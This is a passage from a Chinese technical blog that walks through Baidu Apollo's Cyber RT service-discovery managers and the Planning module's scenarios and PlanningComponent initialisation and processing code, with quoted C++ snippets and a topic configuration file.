class="hljs-keyword">auto</span>&amp; slot : slots_) &#123;<br>        local.<span class="hljs-built_in">emplace_back</span>(slot);<br>      &#125;<br><br>    <span class="hljs-keyword">if</span> (!local.<span class="hljs-built_in">empty</span>()) &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; slot : local)<br>        (*slot)(args...);<br>    &#125;<br>    <span class="hljs-built_in">ClearDisconnectedSlots</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>好，<code>TopologyManager</code> 的功能基本就说完了，接下来让我们看看它的三个成员。</p><h3 id="Manager">Manager</h3><p>我承认这部分内容对了解整个 Apollo 系统有帮助，但这些内容也有点偏离我所在的课题组最初的任务目标，而且考虑到这里面细节繁多，想要逐一了解完全会花费许多精力，但缺少这部分内容又显得不太完整，因此我打算对这部分内容作一个简短的说明，部分解释会不到位甚至出现错误，也请理解。如果想进一步了解，可以参考一下文后的参考链接。</p><p>先来说说这三者的基类——<code>Manager</code> 。<code>Manager</code> 类的成员主要就是一个 Fast RTPS 的 <code>publisher_</code> 和一个 <code>subscriber_</code> ，订阅者对应的回调函数 <code>listener_</code> 和 <code>signal_</code> 信号槽。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Manager</span> &#123;<br>  <span class="hljs-comment">/* ....  */</span><br>  ChangeType change_type_;<br>  std::string host_name_;<span class="hljs-comment">// </span><br>  <span class="hljs-type">int</span> process_id_;<br>  std::string channel_name_;<br>  eprosima::fastrtps::Publisher* publisher_;<br>  eprosima::fastrtps::Subscriber* subscriber_;<br>  SubscriberListener* listener_;<br>  ChangeSignal signal_;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>TopologyManager</code> 初始化时，我说过 <code>NodeManager</code> 、<code>ChannelManager</code> 和 <code>ServiceManager</code> 在这时被创建并初始化的。</p><p>在 <code>CreateSubscriber()</code> 创建订阅者时，<code>listener_</code> 绑定了 <code>Manager::OnRemoteChange()</code> 函数。而 <code>OnRemoteChange</code> 函数会调用 <code>Dispose()</code> 来对这些远处传来的消息进行处理。每当通信网络中有参与者加入或离开拓扑结构时，程序会调用 <code>Manager::Join()</code> 或 <code>Manager::Leave()</code>，这两个函数会通过 RTPS 底层库发布相应的消息，然后订阅者的回调函数 <code>listener_</code> 就被调用了。<br>与 <code>TopologyManager</code> 类一样，有一类似于 Qt 的信号槽机制，<code>signal_</code> ——有若干个注册过的回调函数。该信号在 <code>Manager::Notify()</code> 时就会调用，执行内部所有的回调函数（与 TopologyManager 那一节所描述的一样）。与你想的一样，注册槽的函数是 <code>Manager::AddChangeListener()</code>。</p><h3 id="NodeManager">NodeManager</h3><p>相比基类，<code>NodeManager</code> 多了一个<code>SingleValueWarehouse</code> 类型的成员。<code>SingleValueWarehouse</code> 类，实质就是一个更高级的线程安全 <code>std::unordered_map</code> 表 。加入和离开拓扑，就是向表中 <code>Add()</code> 或 <code>Remove()</code> 节点。而对于 <code>NodeManager::Dispose()</code> 函数，它会根据消息种类来向表中加入或删除节点，然后调用 <code>Notify()</code> 函数，通知（执行）等待该信号槽的回调函数。</p><p>我们知道，<code>NodeManager</code> 类管理 <code>Node</code> 网络拓扑。那么它具体体现在哪里呢？令我惊讶的是，他居然在 <code>NodeChannelImpl</code> 类中。当 <code>Node</code> 被创建或销毁的时候，进行<code>Join()</code>  或 <code>Leave()</code> 操作。Node 网络主要是监察所有节点的存活，并提供查询接口。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">NodeChannelImpl</span>(<span class="hljs-type">const</span> std::string&amp; node_name)<br>      : <span class="hljs-built_in">is_reality_mode_</span>(<span class="hljs-literal">true</span>), <span class="hljs-built_in">node_name_</span>(node_name) &#123;<br>     <span class="hljs-comment">/*  给 node_attr 赋值  */</span><br>    <span class="hljs-type">uint64_t</span> node_id = common::GlobalData::<span class="hljs-built_in">RegisterNode</span>(node_name);<br>    node_attr_.<span class="hljs-built_in">set_node_id</span>(node_id);<br>    is_reality_mode_ = common::GlobalData::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">IsRealityMode</span>();<br>    <span class="hljs-keyword">if</span> (is_reality_mode_) &#123;<br>      node_manager_ =<br>          service_discovery::TopologyManager::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">node_manager</span>();<br>      node_manager_-&gt;<span class="hljs-built_in">Join</span>(node_attr_, RoleType::ROLE_NODE);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">NodeChannelImpl</span>() &#123;<br>    <span class="hljs-keyword">if</span> (is_reality_mode_) &#123;<br>      node_manager_-&gt;<span class="hljs-built_in">Leave</span>(node_attr_, RoleType::ROLE_NODE);<br>      node_manager_ = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ChannelManager">ChannelManager</h3><p>相比基类，<code>ChannelManager</code> 多了四个<code>MultiValueWarehouse</code> 类型（其本质是线程安全的 <code>std::unordered_multimap</code>）的成员，还有一个 <code>Graph</code> 类。它们分别记录读写者间的关系及它们形成的网络图结构，并分别以 node id 和 channel id 为主键来保存读写者。其他过程与 <code>NodeManager</code> 类似，保存的信息和索引方式略有不同。</p><p><code>ChannelManager</code> 类管理 <code>Reader</code> 和 <code>Writer</code> 的信道拓扑网络。<code>Reader</code> 和 <code>Writer</code> 对象在初始化时会调用 <code>JoinTheTopology()</code> 函数加入拓扑结构，而在它们被 <code>Shutdown()</code> 时调用 <code>LeaveTheTopology()</code> 函数离开拓扑。以 <code>Reader</code> 的情况为例：</p><ul><li><code>JoinTheTopology()</code> 函数会先把 <code>Reader &amp; Writer::OnChannelChange()</code> 注册到<code>ChannelManager</code> 的信号槽中，这样当信道拓扑结构发生变化时，回调函数 <code>OnChannelChange()</code> 就会被执行，<code>Reader</code> 就会得知信道已经改变。</li><li>获取信道中所有的 <code>Writer</code> ，并调整自己的 <code>receiver_</code> ，让这些写者发出的信息能被 <code>Reader</code> 获取。<code>Enable()</code> 函数实际上也是让某一回调函数加入到信号槽中，真是一招鲜吃遍天 :man_shrugging:</li><li>最后调用 <code>join()</code> 函数，把自己加入信道网络拓扑中。当然，一旦有新参与者加入，就会引起拓扑网络变化，会调用对应信道的节点的回调函数，最终让存在于该信道的 <code>Writer</code> 得知有新的 <code>Reader</code> 加入。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">void</span> Reader&lt;MessageT&gt;::<span class="hljs-built_in">JoinTheTopology</span>() &#123;<br>  <span class="hljs-comment">// add listener</span><br>  change_conn_ = channel_manager_-&gt;<span class="hljs-built_in">AddChangeListener</span>(std::<span class="hljs-built_in">bind</span>(<br>      &amp;Reader&lt;MessageT&gt;::OnChannelChange, <span class="hljs-keyword">this</span>, std::placeholders::_1));<br><br>  <span class="hljs-comment">// get peer writers</span><br>  <span class="hljs-type">const</span> std::string&amp; channel_name = <span class="hljs-keyword">this</span>-&gt;role_attr_.<span class="hljs-built_in">channel_name</span>();<br>  std::vector&lt;proto::RoleAttributes&gt; writers;<br>  channel_manager_-&gt;<span class="hljs-built_in">GetWritersOfChannel</span>(channel_name, &amp;writers);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; writer : writers) &#123;<br>    receiver_-&gt;<span class="hljs-built_in">Enable</span>(writer);<br>  &#125;<br>  channel_manager_-&gt;<span class="hljs-built_in">Join</span>(<span class="hljs-keyword">this</span>-&gt;role_attr_, proto::RoleType::ROLE_READER,<br>                         message::HasSerializer&lt;MessageT&gt;::value);<br>&#125;<br><br><span class="hljs-type">void</span> Reader&lt;MessageT&gt;::<span class="hljs-built_in">LeaveTheTopology</span>() &#123;<br>  channel_manager_-&gt;<span class="hljs-built_in">RemoveChangeListener</span>(change_conn_);<br>  channel_manager_-&gt;<span class="hljs-built_in">Leave</span>(<span class="hljs-keyword">this</span>-&gt;role_attr_, proto::RoleType::ROLE_READER);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ServiceManage">ServiceManage</h3><p><code>ServiceManager</code> 类相比其基类，多了一个 <code>MultiValueWarehouse</code> 和 <code>SingleValueWarehouse</code> 类型，分别为 <code>servers_</code>、<code>clients_</code> 两个表。有新的 <code>Server</code> 或 <code>Client</code> 加入时，这两张表会更新，当然这些数据结构也提供了查询功能，判断某一个服务是否存在等。</p><h2 id="总结">总结</h2><p>对于 <code>TopologyManager</code> ，其主要功能就是监视网络拓扑结构中是否有参与者加入或离开。主要的监听任务由 <code>CreateParticipant()</code> 函数中创建的 <code>Participant</code> 对象完成。它包含 host name 和 process id ，还有监听器 <code>ParticipantListener</code> ，本质是一个网络变化后就执行的回调函数。当网络拓扑发生变化时，从底层 Fast RTPS 传上来的信息 ，会先在 <code>Convert()</code> 函数中被转换成 Cyber RT 中的数据结构 <code>ChangeMsg</code>，然后，监听器会执行 <code>OnParticipantChange()</code> ，三个子管理器就开始更新网络信息。</p><h2 id="参考">参考</h2><p>[1] <a href="https://blog.csdn.net/qq_25762163/article/details/104001692#ChannelManager_30">百度Apollo系统学习-Cyber RT 通信-服务发现</a></p><p>[2] <a href="https://blog.csdn.net/jinzhuojun/article/details/108066714">自动驾驶平台Apollo 5.5阅读手记：Cyber RT中的通信传输</a></p>]]></content>
    
    
    <categories>
      
      <category>Apollo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apollo</tag>
      
      <tag>Cyber RT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apollo Planning 规划模块</title>
    <link href="/2020/11/11/2020-11-11-ApolloPlanning/"/>
    <url>/2020/11/11/2020-11-11-ApolloPlanning/</url>
    
    <content type="html"><![CDATA[<h1>Apollo Planning 模块</h1><h2 id="前言">前言</h2><p>本篇博客对 Apollo 的规划（Planning）模块做详细介绍。根据官方文档<sup>1</sup>，规划模块的主要功能是对自动驾驶车辆未来的时空轨迹进行规划。为了让读者对规划模块在整个 Apollo 系统中的位置有一个大致的印象，我特意从官网上截取此图👇。可以看到规划模块的数据上游是定位（Localization），预测（Prediction），感知（Perception）模块，而下游是控制（Control）模块。</p><p><img src="/img/Apollo_3_5_software_architecture.png" alt=""></p><h2 id="场景">场景</h2><p>规划模块中，Apollo 设计团队引入了场景的概念，每个驾驶案例都被当做为一个不同的驾驶场景，这使得规划模块更具模块化，且更有针对性。更重要的是，对一个特定场景的修改不会影响其他场景。Apollo 5.5 主要注重于城市道路上的沿车道线自动驾驶，并引入了两种新的规划场景<sup>2</sup>。这里主要介绍 5 种驾驶场景，由于篇幅原因，我就在这里做简要介绍，详细内容可以点击<a href="https://github.com/ApolloAuto/apollo/blob/r5.5.0/modules/planning/README.md">参考文献 [2]</a>。</p><h3 id="沿车道线行驶">沿车道线行驶</h3><p>默认场景模式，该场景包括但不限于遵守基本交通规则，或者基本转弯的单车道（例如巡航）或变道。</p><center>    <img src="https://github.com/ApolloAuto/apollo/raw/r5.5.0/modules/planning/images/Planning_default.png" width="80%"/></center><h3 id="会车">会车</h3><p>该场景包括了在有停:stop_sign: 标志的、有交通灯 :traffic_light: 的、什么都没有的十字路口上的会车情况。总的来说，自动驾驶车辆在遇到这些十字路口时，都会先抵达十字路口边，然后注意观察来往车辆并小心前进，最终通过十字路口</p><center><img src="https://github.com/ApolloAuto/apollo/raw/r5.5.0/modules/planning/images/unprotected1.png" width="80%"/></center><h3 id="停车">停车</h3><p>停车场景中采用了一个令 Apollo 团队感到非常骄傲的 <a href="https://github.com/ApolloAuto/apollo/blob/master/docs/specs/Open_Space_Planner.md">Open Space Planner</a> 算法，该规划算法尤其适用于停车场景。文档中，一共介绍了两个子场景：</p><ul><li><p>Valet 场景，用于将车辆停放在一个目标车位中</p>  <center>      <img src="https://github.com/ApolloAuto/apollo/raw/r5.5.0/modules/planning/images/parking2.png" width="80%"/>  </center></li><li><p>Pull Over 场景，用于到达目的地后，完成的路边停车任务。</p>  <center>      <img src="https://github.com/ApolloAuto/apollo/raw/r5.5.0/modules/planning/images/pull_over1.png" width="80%"/>  </center></li></ul><h3 id="即停即走（Park-and-go）">即停即走（Park-and-go）</h3><p>即停即走场景用于路边停车，并开始生成到达下一个目的地的新路径，有点像出租车放下一名乘客后的场景，对于路边交付，乘客接送或下车等情况非常有用。该场景将 Open Space Planner 算法与其他传统的轨迹规划算法结合在一起，以确保汽车不仅安全停车，而且还能够按照生成的轨迹驶出停车位。</p><center>    <img src="https://github.com/ApolloAuto/apollo/raw/r5.5.0/modules/planning/images/park_and_go.png" width="80%"/></center><h3 id="紧急状况">紧急状况</h3><p>紧急场景是为确保在给定触发事件的情况下（通过人工输入或由于一个或多个软硬件故障）让车辆能安全停下。 该场景对于城市驾驶极为重要，因为在道路上经常会遇到几种无法预料的情况，要求车辆完全停车。例如，有两种类型的紧急停车：</p><ul><li>靠边停车，自动驾驶车辆使用 Open Space Planner 靠边停车</li><li>在车道停止，自动驾驶汽车在充分意识到周遭安全的情况下，在车道内停车</li></ul><center>    <img src="https://github.com/ApolloAuto/apollo/raw/r5.5.0/modules/planning/images/emergency.png" width="80%"/></center><h2 id="规划模块的体系结构">规划模块的体系结构</h2><p>在 Apollo 5.5 版本中，Apollo 团队对规划模块的体系结构进行了修改，以纳入城市道路上的新驾驶方案。 如下图所示，因为新加入了有两种复杂方案：紧急情况和即停即走。为了有效地使用这些方案，团队引入了 2 个新的决策器—路径重用决策器（Path Reuse Decider）和限速决策器（Speed Bound Decider），并更新了现有决策器，使规划体系结构既强大又灵活，足以应付许多不同类型的城市道路驾驶方案。</p><p>每个驾驶场景都有其独特的驾驶参数集，使其更安全，高效，更易于自定义和调试，也更加灵活。</p><center>    <img src="https://github.com/ApolloAuto/apollo/raw/r5.5.0/modules/planning/images/architecture_5.5.png" /></center>## 规划模块之组件类<p>如果你认真了解了 <a href="https://dingfen.github.io/apollo/2020/10/25/CyberComponent.html">Apollo Cyber RT 组件</a>的相关知识，就明白模块的起点就是 <code>Component</code> 类，一切的模块都是继承 <code>Component</code> 类而来的。自然地，我把这它作为全面认识规划模块的切入点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PlanningComponent</span> <span class="hljs-keyword">final</span><br>    : <span class="hljs-keyword">public</span> cyber::Component&lt;prediction::PredictionObstacles, canbus::Chassis,<br>                              localization::LocalizationEstimate&gt; &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Init</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Proc</span><span class="hljs-params">(<span class="hljs-type">const</span> std::shared_ptr&lt;prediction::PredictionObstacles&gt;&amp;</span></span><br><span class="hljs-params"><span class="hljs-function">                prediction_obstacles,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> std::shared_ptr&lt;canbus::Chassis&gt;&amp; chassis,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> std::shared_ptr&lt;localization::LocalizationEstimate&gt;&amp;</span></span><br><span class="hljs-params"><span class="hljs-function">                localization_estimate)</span> <span class="hljs-keyword">override</span></span>;<br> <span class="hljs-keyword">private</span>:<br>  std::shared_ptr&lt;cyber::Reader&lt;perception::TrafficLightDetection&gt;&gt;<br>      traffic_light_reader_;<br>  std::shared_ptr&lt;cyber::Reader&lt;routing::RoutingResponse&gt;&gt; routing_reader_;<br>  std::shared_ptr&lt;cyber::Reader&lt;planning::PadMessage&gt;&gt; pad_msg_reader_;<br>  std::shared_ptr&lt;cyber::Reader&lt;relative_map::MapMsg&gt;&gt; relative_map_reader_;<br>  std::shared_ptr&lt;cyber::Reader&lt;storytelling::Stories&gt;&gt; story_telling_reader_;<br><br>  std::shared_ptr&lt;cyber::Writer&lt;ADCTrajectory&gt;&gt; planning_writer_;<br>  std::shared_ptr&lt;cyber::Writer&lt;routing::RoutingRequest&gt;&gt; rerouting_writer_;<br>  std::shared_ptr&lt;cyber::Writer&lt;PlanningLearningData&gt;&gt;<br>      planning_learning_data_writer_;<br><span class="hljs-comment">/*   ....   */</span><br> <span class="hljs-comment">// 与 Reader 一一对应的私有变量</span><br>  perception::TrafficLightDetection traffic_light_;<br>  routing::RoutingResponse routing_;<br>  planning::PadMessage pad_msg_;<br>  relative_map::MapMsg relative_map_;<br>  storytelling::Stories stories_;<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们一条条地看，<code>PlanningComponent</code> 类继承的是 <code>Component&lt;prediction::PredictionObstacles, canbus::Chassis,  localization::LocalizationEstimate&gt;</code> 类，简单地说，从名字上看，<code>PlanningComponent</code> 类需要处理三类消息：</p><ul><li><code>prediction::PredictionObstacles</code> 预测的障碍物行为</li><li><code>canbus::Chassis</code>  canbus 总线传来的底盘状态</li><li><code>localization::LocalizationEstimate</code> 来自定位模块的定位信息</li></ul><p>但是，<code>PlanningComponent</code> 类内部有非常多的不同类型的订阅者 <code>Reader</code> 和发布者 <code>Writer</code> 。这些订阅者和发布者的用途，大都可以通过名称猜出个大概。值得注意的是，类的成员变量中，存在与 <code>Reader</code> 一一对应的变量，看起来它们是用于存放对应的 <code>Reader</code> 接收的消息，很快下文就证实了我的猜想:smiley:。</p><span id="Init" ><h3 id="初始化">初始化</h3><p><code>Init()</code> 函数实现了模块初始化，在 <code>modules/</code> 中的代码不论取名、类型还是函数实现都非常长，这点不同于 Cyber RT，因此在大多数情况下，我选择部分截取代码，如果想要看完整的代码，移步 <code>modules/planning/planning_component.cc::Init()</code> 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++">injector_ = std::<span class="hljs-built_in">make_shared</span>&lt;DependencyInjector&gt;();<br><span class="hljs-keyword">if</span> (FLAGS_use_navigation_mode)<br>  planning_base_ = std::<span class="hljs-built_in">make_unique</span>&lt;NaviPlanning&gt;(injector_);<br><span class="hljs-keyword">else</span><br>  planning_base_ = std::<span class="hljs-built_in">make_unique</span>&lt;OnLanePlanning&gt;(injector_);<br><br><span class="hljs-built_in">ACHECK</span>(ComponentBase::<span class="hljs-built_in">GetProtoConfig</span>(&amp;config_))<br>    &lt;&lt; <span class="hljs-string">&quot;failed to load planning config file &quot;</span><br>    &lt;&lt; ComponentBase::<span class="hljs-built_in">ConfigFilePath</span>();<br><br><span class="hljs-keyword">if</span> (FLAGS_planning_offline_learning ||<br>    config_.<span class="hljs-built_in">learning_mode</span>() != PlanningConfig::NO_LEARNING)<br>  <span class="hljs-keyword">if</span> (!message_process_.<span class="hljs-built_in">Init</span>(config_, injector_))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>planning_base_-&gt;<span class="hljs-built_in">Init</span>(config_);<br></code></pre></td></tr></table></figure><p>上面代码首先创建了一个 <code>DependencyInjector</code> 类的指针，然后根据 <code>FLAGS_use_navigation_mode</code> 模式的不同，选择创建不同的 <code>PlanningBase</code> 的子类，然后就是读取配置文件路径，再就是 <code>PlanningBase</code> 子类的初始化。先来说说这些规划子类的区别。</p><ul><li><code>OpenSpacePlanning</code>  主要的应用场景是自主泊车和狭窄路段的掉头，<a href="https://github.com/ApolloAuto/apollo/blob/master/docs/specs/Open_Space_Planner.md">官方文档参考</a>，但很奇怪的是，我没有找到相应的实现代码:confused:</li><li><code>NaviPlanning</code>   主要用于在确定了导航路线的情况下的自动驾驶</li><li><code>OnLanePlanning</code>   主要的应用于开放道路下沿车道线的自动驾驶。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++">  routing_reader_ = node_-&gt;<span class="hljs-built_in">CreateReader</span>&lt;RoutingResponse&gt;(<br>      config_.<span class="hljs-built_in">topic_config</span>().<span class="hljs-built_in">routing_response_topic</span>(),<br>      [<span class="hljs-keyword">this</span>](<span class="hljs-type">const</span> std::shared_ptr&lt;RoutingResponse&gt;&amp; routing) &#123;<br>        AINFO &lt;&lt; <span class="hljs-string">&quot;Received routing data: run routing callback.&quot;</span><br>              &lt;&lt; routing-&gt;<span class="hljs-built_in">header</span>().<span class="hljs-built_in">DebugString</span>();<br>        std::lock_guard&lt;std::mutex&gt; <span class="hljs-built_in">lock</span>(mutex_);<br>        routing_.<span class="hljs-built_in">CopyFrom</span>(*routing);<br>      &#125;);<br><span class="hljs-comment">// 接下来几个 Reader 类似的写法</span><br>  planning_writer_ = node_-&gt;<span class="hljs-built_in">CreateWriter</span>&lt;ADCTrajectory&gt;(<br>      config_.<span class="hljs-built_in">topic_config</span>().<span class="hljs-built_in">planning_trajectory_topic</span>());<br><span class="hljs-comment">// 接下来的 Writer 类似的写法</span><br></code></pre></td></tr></table></figure><p>紧接着，<code>Init()</code> 函数就用<a href="https://dingfen.github.io/apollo/2020/11/03/CyberCommu1.html">我之前博文中介绍的方式</a>创建订阅者 <code>Reader</code> 和发布者 <code>Writer</code> 。仔细看上面给出的代码，<code>CreateReader</code> 函数的参数，一个是从配置文件中取得相应的配置信息，另一个是构建的回调函数。</p><p>咱们先来看一下后者：构建函数。根据我在<a href="https://dingfen.github.io/apollo/2020/11/07/CyberCommu2.html">这篇博客中所讲的流程</a>，传入的回调函数是在 <code>Reader</code> 接收到消息后就会被调用的，从内容来看，<code>Reader</code> 在收到对应的消息后，调用 <code>CopyFrom()</code> 函数，把消息拷贝到自己的私有变量中。至于 <code>Writer</code> 就比较平凡了，就是获取了配置文件里相应的信息:man_shrugging:。</p><p>那么这个“配置文件中的相应信息”到底是什么信息呢:confused:？打开 <code>modules/planning/conf/planning_config.pb.txt</code>，你就会恍然大悟:point_down:，原来上面代码中的 <code>config_.topic_config().planning_trajectory_topic()</code>  就是一个字符串，对应的就是信道的名字。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-title class_">topic_config</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">  chassis_topic:</span> <span class="hljs-string">&quot;/apollo/canbus/chassis&quot;</span><br><span class="hljs-symbol">  hmi_status_topic:</span> <span class="hljs-string">&quot;/apollo/hmi/status&quot;</span><br><span class="hljs-symbol">  localization_topic:</span> <span class="hljs-string">&quot;/apollo/localization/pose&quot;</span><br><span class="hljs-symbol">  planning_pad_topic:</span> <span class="hljs-string">&quot;/apollo/planning/pad&quot;</span><br><span class="hljs-symbol">  planning_trajectory_topic:</span> <span class="hljs-string">&quot;/apollo/planning&quot;</span><br><span class="hljs-symbol">  prediction_topic:</span> <span class="hljs-string">&quot;/apollo/prediction&quot;</span><br><span class="hljs-symbol">  relative_map_topic:</span> <span class="hljs-string">&quot;/apollo/relative_map&quot;</span><br><span class="hljs-symbol">  routing_request_topic:</span> <span class="hljs-string">&quot;/apollo/routing_request&quot;</span><br><span class="hljs-symbol">  routing_response_topic:</span> <span class="hljs-string">&quot;/apollo/routing_response&quot;</span><br><span class="hljs-symbol">  story_telling_topic:</span> <span class="hljs-string">&quot;/apollo/storytelling&quot;</span><br><span class="hljs-symbol">  traffic_light_detection_topic:</span> <span class="hljs-string">&quot;/apollo/perception/traffic_light&quot;</span><br><span class="hljs-symbol">  planning_learning_data_topic:</span> <span class="hljs-string">&quot;/apollo/planning/learning_data&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这就是初始化函数的全部内容了。</p><h3 id="处理">处理</h3><p>再来看 <code>PlanningComponent::Proc()</code> 函数，之前的博客中我说过，<code>Proc()</code> 函数是可以由用户自己编写完成的，而之后，该函数会被封装处理，最终让对应的协程开始执行。不同于在 Cyber RT 中的精雕细琢，我这次采用不同的办法，先快速过一遍 <code>Proc()</code> 函数，然后找出自己感兴趣的，进而深入研究。那么先来看 <code>Proc()</code> 函数的第一部分：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 函数头前面已经给出了 这里就不放了 并去掉了一些错误诊断语句</span><br><span class="hljs-comment">// check and process possible rerouting request</span><br>  <span class="hljs-built_in">CheckRerouting</span>();<br><br><span class="hljs-comment">// process fused input data</span><br>  local_view_.prediction_obstacles = prediction_obstacles;<br>  local_view_.chassis = chassis;<br>  local_view_.localization_estimate = localization_estimate;<br>  &#123;<br>    <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mutex_)</span></span>;<br>    <span class="hljs-keyword">if</span> (!local_view_.routing ||<br>        hdmap::PncMap::<span class="hljs-built_in">IsNewRouting</span>(*local_view_.routing, routing_)) &#123;<br>      local_view_.routing =<br>          std::<span class="hljs-built_in">make_shared</span>&lt;routing::RoutingResponse&gt;(routing_);<br>    &#125;<br>  &#125;<br>  &#123;<br>    <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mutex_)</span></span>;<br>    local_view_.traffic_light =<br>        std::<span class="hljs-built_in">make_shared</span>&lt;TrafficLightDetection&gt;(traffic_light_);<br>    local_view_.relative_map = std::<span class="hljs-built_in">make_shared</span>&lt;MapMsg&gt;(relative_map_);<br>  &#125;<br>  &#123;<br>    <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mutex_)</span></span>;<br>    local_view_.pad_msg = std::<span class="hljs-built_in">make_shared</span>&lt;PadMessage&gt;(pad_msg_);<br>  &#125;<br>  &#123;<br>    <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mutex_)</span></span>;<br>    local_view_.stories = std::<span class="hljs-built_in">make_shared</span>&lt;Stories&gt;(stories_);<br>  &#125;<br></code></pre></td></tr></table></figure><p>首先，<code>Proc()</code> 函数调用 <code>CheckRerouting()</code> 检查并处理了可能的重新路由需求，然后就是构建自己对象内的成员 <code>local_view_</code> ，没错，为了防止多线程竞争，使用了非常多次的互斥锁:lock: 。该成员变量包含了所有规划模块需要的输入，这些输入信息非常重要，可能会经常使用，详细情况在下文的<a 